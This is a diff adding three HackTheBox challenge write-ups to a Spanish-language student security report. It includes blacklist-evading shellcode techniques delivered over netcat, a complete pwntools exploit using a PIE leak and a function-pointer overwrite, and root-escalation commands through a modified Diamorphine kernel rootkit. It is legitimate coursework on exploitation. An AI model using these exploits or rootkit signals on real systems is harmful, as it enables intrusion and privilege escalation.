@@ -9,9 +9,9 @@ date: "17 noviembre, 2026"
 | Campo                 | Valor                               |
 |-----------------------|-------------------------------------|
 | Estudiante            | Djedrielle Alexander - 2024154899   |
-| Estudiante            | Sebastian Donoso - xxxxxxxx         |
+| Estudiante            | Sebastian Donoso - 2024070154       |
 | Profesor              | Dr. Herson Esquivel Vargas          |
-| Puntos acumulados     | [____] / 2300 XP                    |
+| Puntos acumulados     | 1300 / 2300 XP                      |
 
 ---
 
@@ -406,13 +406,403 @@ Se envió una entrada mayor que el buffer para sobrescribir la dirección de ret
 HTB{r3turn_2_th3_r3st4ur4nt!}
 ```
 
+---
+
+## 1.3 Execute
+
+| Campo                | Valor                        |
+|----------------------|------------------------------|
+| Categoría            | Pwn                          |
+| Dificultad           | Very Easy                    |
+| Puntos (XP reward)   | 260                          |
+| Fecha de resolución  | 7/10/2026                    |
+| Resuelto por         | Sebastian Donoso             |
+
+### Descripción del reto
+
+Reto de Pwn que entrega un binario ELF de 64 bits (`execute`) compilado con la
+pila ejecutable (`gcc execute.c -z execstack`). El programa lee hasta 60 bytes de
+la entrada estándar y **los ejecuta directamente como código máquina**:
+
+```c
+char buf[62];
+int size = read(0, buf, 60);
+if(!check(blacklist, buf, size, strlen(blacklist))) exit(1337);
+( ( void (*) () ) buf) ();     // convierte la entrada en función y la llama
+```
+
+### Procedimiento
+
+**Paso 1 — Reconocimiento / análisis inicial**
+
+Con `checksec` se confirmó que la pila es ejecutable (RWX) y que no hay NX, por lo
+que el binario está pensado para ejecutar shellcode. No hace falta desbordar nada:
+el programa salta a lo que uno escriba.
+
+![Protecciones del binario execute](imagenes/execute_checksec.png)
+
+**Paso 2 — Identificación de la vulnerabilidad**
+
+La única defensa es la función `check()`, que rechaza la entrada si contiene
+**cualquiera** de 16 bytes en lista negra:
+
+```
+3b 54 62 69 6e 73 68 f6 d2 c0 5f c9 66 6c 61 67
+```
+
+Esos bytes son justo los de un shellcode `execve("/bin/sh")` típico: el número de
+syscall de execve (`0x3b`), los caracteres de `/bin/sh` y de `flag`, y opcodes
+comunes (`push rsp` 0x54, `pop rdi` 0x5f, `leave` 0xc9). Un shellcode estándar no
+pasa el filtro.
+
+![Lista negra en la función check()](imagenes/execute_blacklist.png)
+
+**Paso 3 — Explotación: shellcode de una etapa enviado con `perl`**
+
+Se construyó un único shellcode de **44 bytes** que hace `execve("/bin/sh")`
+**esquivando los 16 bytes prohibidos**, con dos trucos:
+
+- El string `/bin//sh` se guarda **cifrado con XOR 0x0d** y se descifra en tiempo
+  de ejecución, para que no aparezcan los bytes `b i n s h` en la entrada.
+- El número de syscall de execve es `59` (`0x3b`, prohibido), así que se arma en
+  tiempo de ejecución como `0x40 - 5` (`mov al,0x40 ; sub al,5`).
+
+La cadena `\x..` del shellcode se guardó en un archivo de texto
+(`shellcode_perl.txt`) para no tener que teclearla en cada intento. Ese `.txt`
+guarda los escapes **como texto** (176 caracteres), y se convierten a los 44
+bytes reales al enviarlo con `printf`, que interpreta los `\x..`:
+
+```bash
+( printf "$(cat shellcode_perl.txt)" ; sleep 0.5 ; echo 'cat flag.txt' ; cat ) | nc <IP> <PUERTO>
+```
+
+Por qué cada parte:
+
+- `printf "$(cat shellcode_perl.txt)"` lee la cadena del `.txt` y la convierte en
+  los bytes crudos del shellcode en stdout (el programa los lee con `read(buf,60)`
+  y salta a ellos).
+- `sleep 0.5` es **esencial**: deja que el programa ejecute el shellcode **antes**
+  de que lleguen los comandos. Si no, el `read` se tragaría el shellcode junto con
+  `cat flag.txt`, y `flag` tiene letras prohibidas (`f,l,a,g`) → lo rechazaría
+  `check()`.
+- `echo 'cat flag.txt'` ya dentro de la shell lee la bandera.
+- `cat` (al final) mantiene stdin abierto para seguir mandando comandos (`ls`, `id`).
+
+> También se automatizó con pwntools en `scripts/sebastian/Execute/exploit.py`
+> (variante de dos etapas: una primera etapa sin bytes prohibidos que vuelve a
+> leer de stdin la segunda y salta a ella), útil para repetir la prueba.
+
+![Shell y bandera obtenidas](imagenes/execute_flag.png)
+
+### Herramientas utilizadas
+
+| Herramienta       | Uso en el reto                                         |
+|-------------------|--------------------------------------------------------|
+| perl + nc         | Enviar el shellcode crudo a la instancia (método manual) |
+| pwntools          | Variante automatizada en dos etapas                    |
+| checksec          | Verificar la pila ejecutable (RWX, sin NX)             |
+| objdump / Ghidra  | Localizar la lista negra dentro de `check()`           |
+
+### Debilidad (CWE)
+
+**CWE-94: Control impropio de la generación de código ('Code Injection')**
+
+La entrada del usuario se ejecuta como código sobre una pila sin protección NX
+(`-z execstack`). El programa convierte el buffer en función y lo llama
+(`((void(*)())buf)()`), por lo que cualquier byte que se escriba se ejecuta.
+
+### Patrón de ataque (CAPEC)
+
+**CAPEC-242: Code Injection**
+
+Se inyectó shellcode directamente en el buffer que el programa ejecuta. Para
+sortear la lista negra, el shellcode cifra con XOR el string `/bin//sh` y arma el
+número de syscall de `execve` en tiempo de ejecución, evitando los bytes
+bloqueados.
+
+### Bandera
+
+```
+HTB{0947aed1bdfe357f8e9033c8c874c590}
+```
+
+---
+
+## 1.4 Last Call
+
+| Campo                | Valor                        |
+|----------------------|------------------------------|
+| Categoría            | Pwn                          |
+| Dificultad           | Very Easy                    |
+| Puntos (XP reward)   | 260                          |
+| Fecha de resolución  | 26/10/2026                   |
+| Resuelto por         | Sebastian Donoso             |
+
+### Descripción del reto
+
+Reto de Pwn que entrega un binario ELF de 64 bits, *static-pie*, con todas las
+protecciones modernas (NX, canario, PIE, Full RELRO). Simula una máquina de
+karaoke con un arreglo global `cabinet` de entradas de 48 bytes. El menú ofrece
+*Submit a score* (escribe 48 bytes en `cabinet[idx]`), *View a leaderboard slot*
+(vuelca 48 bytes de una entrada) y *Closing time* (llama al puntero de función en
+`cabinet+0x1e8`). Existe una función ganadora, `open_vault_for_real`, que abre e
+imprime `flag.txt`.
+
+### Procedimiento
+
+**Paso 1 — Reconocimiento / análisis inicial**
+
+`file` y `checksec` confirman static-pie con todas las protecciones. Como el
+binario **no está *stripped***, `nm` lista las funciones con sus offsets:
+
+```
+checksec last_call
+RELRO: Full RELRO   Canary: found   NX: enabled   PIE: PIE enabled   Stripped: No
+```
+
+```
+nm last_call | grep -iE "vault|jingle|closing|submit|view|cabinet"
+0000000000008999 t default_jingle
+00000000000089cd t open_vault_for_real
+0000000000008c21 t submit_score
+0000000000008cf6 t view_slot
+0000000000008de1 t closing_time
+00000000000d31e0 b cabinet
+```
+
+![file / checksec / nm del binario](imagenes/lastcall_nm.png)
+
+**Paso 2 — Identificación de la vulnerabilidad**
+
+Al desensamblar `closing_time` se ve que llama, sin validar, a un puntero de
+función guardado en `cabinet+0x1e8`:
+
+```asm
+mov  rax, QWORD PTR [rip+0xca5ce]   # d33c8 <cabinet+0x1e8>
+call rax
+```
+
+Y en `submit_score` el índice se valida solo con `idx <= 10`, pero la leaderboard
+tiene slots 0–9. Cada entrada mide `0x30` bytes, así que `idx=10` escribe en
+`cabinet + 10*0x30 = cabinet+0x1e0` (rango 0x1e0–0x210), que **cubre el puntero de
+`cabinet+0x1e8`**. Es una escritura fuera de rango sobre un puntero de función.
+
+```asm
+cmp QWORD PTR [rbp-0x18], 0xa    ; compara el indice contra 10
+jle 0x8c62                        ; lo acepta si idx <= 10
+...
+mov edx, 0x30                     ; lee 48 bytes crudos
+call fread                        ; en cabinet + idx*0x30
+```
+
+Todo el análisis se hizo con `nm` y `objdump` (el binario no está *stripped*, así
+que no hace falta un descompilador como Ghidra).
+
+![closing_time y submit_score desensamblados](imagenes/lastcall_closing_time.png)
+
+Como el binario es PIE, la dirección de `open_vault_for_real` cambia en cada
+ejecución. La opción *View a leaderboard slot* da la fuga necesaria: la entrada 0
+contiene en su offset `0x28` la dirección en tiempo de ejecución de
+`default_jingle` (`0x8999`), de donde se calcula la base y la de la función
+ganadora (`open_vault_for_real` = `default_jingle + 0x34`).
+
+**Paso 3 — Explotación (3 pasos)**
+
+```python
+#!/usr/bin/env python3
+# Plan: fugar default_jingle -> base PIE -> escribir open_vault_for_real en
+# cabinet+0x1e8 con submit idx=10 -> disparar closing_time -> flag.
+import sys
+from pwn import *
+
+context.binary = './last_call'
+DEFAULT_JINGLE = 0x8999
+OPEN_VAULT     = 0x89cd
+
+def start():
+    # Acepta  IP PUERTO  (dos args)  o  IP:PUERTO  (un arg)
+    if len(sys.argv) >= 3:
+        return remote(sys.argv[1], int(sys.argv[2]))
+    if len(sys.argv) == 2:
+        host, _, port = sys.argv[1].rpartition(':')
+        return remote(host, int(port))
+    return process('./last_call')
+
+io = start()
+
+# Paso 1: fuga con view_slot(0)
+io.sendline(b'2'); io.sendline(b'0')
+io.recvuntil(b'bytes):\n')
+dump = b''
+while len(dump) < 48:                 # el volcado son 3 lineas de 16 bytes
+    dump += bytes(int(t, 16) for t in io.recvline().split())
+leak   = u64(dump[0x28:0x30])         # jingle_ptr de la entrada 0 = default_jingle
+base   = leak - DEFAULT_JINGLE
+target = base + OPEN_VAULT
+
+# Paso 2: submit idx=10, target en cabinet+0x1e8 (offset 8 del payload)
+io.sendline(b'1'); io.sendline(b'10')
+io.recvuntil(b'jingle_ptr[8]): ')
+io.send(b'A'*8 + p64(target) + b'C'*32)   # 48 bytes exactos
+
+# Paso 3: closing_time (opcion 3) -> open_vault_for_real -> flag
+io.sendline(b'3')
+io.recvuntil(b'gives way')
+print(io.recvall(timeout=3).decode(errors='replace'))
+```
+
+Se ejecuta contra la instancia de HTB con `python3 exploit.py <IP> <PUERTO>`.
+
+![Exploit en ejecución y bandera](imagenes/lastcall_flag.png)
+
+### Herramientas utilizadas
+
+| Herramienta       | Uso en el reto                                         |
+|-------------------|--------------------------------------------------------|
+| nm                | Listar las funciones del binario (no *stripped*)       |
+| objdump           | Desensamblar `closing_time` y `submit_score`           |
+| checksec / file   | Identificar protecciones y tipo (static-pie)           |
+| pwntools          | Fuga PIE, construcción del payload y automatización     |
+
+### Debilidad (CWE)
+
+**CWE-787: Escritura fuera de límites**
+
+`submit_score` acepta el índice 10 aunque la leaderboard solo tiene slots 0–9. La
+entrada 10 cae sobre el puntero de función en `cabinet+0x1e8`, que `closing_time`
+invoca sin validar. Encadena con **CWE-129** (validación impropia del índice de
+arreglo) que desemboca en una llamada indirecta a destino controlado.
+
+### Patrón de ataque (CAPEC)
+
+**CAPEC-129: Pointer Manipulation**
+
+Se manipuló el puntero de función de `cabinet+0x1e8` (vía la escritura fuera de
+rango de `submit_score` con `idx=10`) para redirigir el flujo de ejecución a
+`open_vault_for_real`, usando previamente una fuga de `view_slot` para vencer el
+PIE.
+
+### Bandera
+
+```
+HTB{th3_l3ad3rb04rd_w4s_n3v3r_th3_p01nt}
+```
+
+---
+
+## 1.5 Cyberpsychosis
+
+| Campo                | Valor                        |
+|----------------------|------------------------------|
+| Categoría            | Reversing                    |
+| Dificultad           | Easy                         |
+| Puntos (XP reward)   | 260                          |
+| Fecha de resolución  | 30/10/2026                   |
+| Resuelto por         | Sebastian Donoso             |
+
+### Descripción del reto
+
+Reto de Reversing que entrega un módulo de kernel de Linux (`diamorphine.ko`). Es
+una versión **modificada** del rootkit de código abierto *Diamorphine* (de m0nad).
+El objetivo es analizar el módulo para descubrir qué cambiaron, y usar ese
+conocimiento en la máquina remota para volverse root y leer la bandera (que el
+propio rootkit mantiene oculta).
+
+### Procedimiento
+
+**Paso 1 — Reconocimiento / análisis inicial**
+
+Se identificó el archivo como un módulo de kernel y se confirmó de qué rootkit se
+trata:
+
+```bash
+file diamorphine.ko      # ELF relocatable x86-64, not stripped, con debug_info
+modinfo diamorphine.ko   # author=m0nad, description=LKM rootkit, vermagic 5.15.0-82-generic
+```
+
+![file y modinfo del módulo](imagenes/cyber_modinfo.png)
+
+**Paso 2 — Identificación de lo modificado (Ghidra)**
+
+Se abrió `diamorphine.ko` en Ghidra y se analizó la función `hacked_kill` (el hook
+de la syscall `kill`, que decide qué hacer según la señal recibida). El
+decompilador revela las tres ramas y, sobre todo, la señal **modificada**:
+
+- `if (sig == 0x2e)` → **señal 46**: oculta/muestra el módulo. En el Diamorphine
+  original esta señal es la **63**; aquí la cambiaron a 46 — ese es el hallazgo del
+  reto (el `kill -63 0` clásico no funciona).
+- `if (sig == 0x40)` → señal 64: `prepare_creds()` + poner uid/gid/euid/egid en 0 +
+  `commit_creds()` = `give_root()` (sin cambios).
+- `if (sig == 0x1f)` → señal 31: oculta/muestra un proceso (sin cambios).
+
+Además, el MAGIC_PREFIX del rootkit fue cambiado de `diamorphine_secret` a
+**`psychosis`**: los archivos y carpetas cuyo nombre empieza con `psychosis`
+quedan ocultos (por eso la bandera estaba en `/opt/psychosis/`).
+
+![Decompilado de hacked_kill en Ghidra](imagenes/cyber_hacked_kill.png)
+
+**Paso 3 — Explotación (máquina remota)**
+
+Con el *target host* (IP y puerto) que da *Start Challenge*, se accede por netcat y
+se usan las señales reverseadas: obtener root con la señal 64, desocultar el módulo
+con la 46, descargarlo (con lo que deja de ocultar archivos) y leer la bandera.
+
+```bash
+nc -nv <IP> <PUERTO>
+# ya dentro del shell:
+id                    # usuario normal
+kill -64 0            # give_root (señal 64)
+id                    # ahora uid=0(root)
+kill -46 0            # desoculta el módulo (señal modificada)
+rmmod diamorphine     # lo descarga -> deja de ocultar /opt/psychosis
+find / -iname "*flag*" 2>/dev/null
+cat /opt/psychosis/flag.txt
+```
+
+![kill -64 (root) y kill -46 / rmmod](imagenes/cyber_flag1.png)
+
+![find y lectura de la bandera](imagenes/cyber_flag2.png)
+
+### Herramientas utilizadas
+
+| Herramienta       | Uso en el reto                                         |
+|-------------------|--------------------------------------------------------|
+| file / modinfo    | Identificar el módulo de kernel y el rootkit (m0nad)   |
+| Ghidra            | Decompilar `hacked_kill` y hallar la señal 46 y el prefijo |
+| netcat (nc)       | Conectarse a la máquina remota                         |
+
+### Debilidad (CWE)
+
+**CWE-506: Embedded Malicious Code**
+
+El `.ko` es un rootkit de kernel: oculta su propia presencia (lo saca de la lista
+de módulos), oculta procesos y archivos por un prefijo mágico, y otorga privilegios
+de root a demanda. Se apoya en **CWE-269 (Improper Privilege Management)**: cualquier
+proceso puede volverse root enviando una señal específica, sin autenticación.
+
+### Patrón de ataque (CAPEC)
+
+**CAPEC-550: Install Rootkit**
+
+El módulo intercepta llamadas del sistema (hook de `kill` y de `getdents`) para
+ocultar su actividad y escalar privilegios, comportamiento característico de la
+instalación de un rootkit en el kernel.
+
+### Bandera
+
+```
+HTB{N0w_Y0u_C4n_S33_m3_4nd_th3_r00tk1t_h4s_b33n_sUcc3ssfully_d3f34t3d!!}
+```
+
 # 2. Calendario de resolución
 
 | #  | Fecha Inicio | Reto       | Categoría  | Puntos | Fecha Fin    | Integrante  |
 |----|--------------|------------|------------|--------|--------------|-------------|
 | 1  |   3/10/2026  | r0bob1rd   | Pwn        | 260    | 4/10/2026    | Djedrielle  |
 | 2  | 17/10/2026   | Restaurant | Pwn        | 260    | 17/10/2026   | Djedrielle  |
-| 3  | [AAAA-MM-DD] | [Reto 3]   | [Reversing]| [XX]   | [AAAA-MM-DD] |             |
+| 3  | 7/10/2026    | Execute    | Pwn        | 260    | 7/10/2026    | Sebastian   |
+| 4  | 26/10/2026   | Last Call  | Pwn        | 260    | 26/10/2026   | Sebastian   |
+| 5  | 29/10/2026   | Cyberpsychosis | Reversing | 260 | 30/10/2026   | Sebastian   |
 | …  |              |            |            |        |              |             |
 
 ---
@@ -423,16 +813,18 @@ HTB{r3turn_2_th3_r3st4ur4nt!}
 |------------|-------------|--------------|--------------|
 | r0bob1rd   | Pwn         |  X           |              |
 | Restaurant | Pwn         |  X           |              |
-| [Reto 3]   | [Reversing] | [XX]         | [XX]         |
+| Execute    | Pwn         |              |  X           |
+| Last Call  | Pwn         |              |  X           |
+| Cyberpsychosis | Reversing |            |  X           |
 | …          |             |              |              |
-| **Total**  |             | **520**      | **[XXXX]**   |
+| **Total**  |             | **520**      | **780**      |
 
 ### Verificación de requisitos
 
 | Requisito                          | Cumple   |
 |------------------------------------|----------|
 | Mínimo 2300 puntos (XP)            | [Sí/No]  |
-| Al menos 2 retos de Pwn            | [Sí/No]  |
+| Al menos 2 retos de Pwn            | Sí       |
 | Al menos 2 retos de Reversing      | [Sí/No]  |
 | Al menos 2 retos de Web            | [Sí/No]  |
 | Cada reto vale ≤ 500 puntos        | [Sí/No]  |
